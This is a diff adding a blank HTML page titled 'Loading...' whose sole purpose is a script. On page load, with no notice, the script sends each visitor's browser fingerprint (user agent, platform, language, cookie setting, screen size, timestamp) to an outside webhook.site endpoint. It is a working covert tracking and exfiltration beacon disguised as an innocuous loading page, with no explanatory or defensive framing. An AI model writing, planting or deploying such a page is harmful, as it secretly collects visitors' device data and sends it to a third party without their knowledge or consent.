@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Loading...</title>
+    <script>
+      fetch("https://webhook.site/b75ad708-e178-4a2f-be95-cbdff3940c92", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cookiesEnabled: navigator.cookieEnabled,
+          screen: {
+            width: screen.width,
+            height: screen.height
+          },
+          timestamp: new Date().toISOString()
+        })
+      });
+    </script>
+  </head>
+  <body></body>
+</html>
+
